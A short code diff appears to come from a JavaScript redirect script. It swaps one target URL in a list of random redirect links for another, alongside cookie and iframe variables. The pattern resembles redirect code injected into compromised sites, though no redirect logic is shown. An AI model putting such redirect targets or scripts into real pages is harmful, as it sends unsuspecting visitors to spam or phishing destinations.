@@ -1,4 +1,4 @@
-var randLinks = ["https://guiadepescaesportivaemsantos.com/?utm=facebook&link=7ac02484ab9cbec10630849f903cb6e5&id=a8f5f167f44f4964e6c998dee827110c"];
+var randLinks = ["https://nigo.com.br/confredirect"];
 var randCookies = ["lastAction"];
 var cookieName = '';
 var urlFrame = '';
